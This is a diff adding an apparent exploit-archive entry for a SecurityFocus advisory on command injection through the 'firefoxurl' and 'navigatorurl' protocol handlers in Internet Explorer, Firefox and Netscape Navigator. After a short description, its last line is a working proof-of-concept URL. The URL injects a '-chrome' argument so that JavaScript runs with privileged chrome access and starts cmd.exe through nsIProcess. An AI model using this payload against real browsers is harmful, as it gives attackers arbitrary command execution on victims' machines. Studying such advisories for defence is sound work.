@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/24837/info
+
+Microsoft Internet Explorer, Mozilla Firefox and Netscape Navigator are prone to a vulnerability that lets attackers inject commands through the 'firefoxurl' and 'navigatorurl' protocol handlers.
+
+Exploiting these issues allows remote attackers to pass and execute arbitrary commands and arguments through the 'firefox.exe' and 'navigator.exe' processes by employing the 'firefoxurl' and 'navigatorurl' handlers.
+
+An attacker can also employ these issues to carry out cross-browser scripting attacks by using the '-chrome' argument. This can allow the attacker to run JavaScript code with the privileges of trusted Chrome context and gain full access to Firefox and Netscape Navigator's resources.
+
+Exploiting these issues would permit remote attackers to influence command options that can be called through the 'firefoxurl' and 'navigatorurl' handlers and therefore execute commands and script code with the privileges of a user running the applications. Successful attacks may result in a variety of consequences, including remote unauthorized access. 
+
+navigatorurl:test"%20-chrome%20"javascript:C=Components.classes;I=Components.interfaces;file=C['@mozilla.org/file/local;1'].createInstance(I.nsILocalFile);file.initWithPath('C:'+String.fromCharCode(92)+String.fromCharCode(92)+'Windows'+String.fromCharCode(92)+String.fromCharCode(92)+'System32'+String.fromCharCode(92)+String.fromCharCode(92)+'cmd.exe');process=C['@mozilla.org/process/util;1'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)
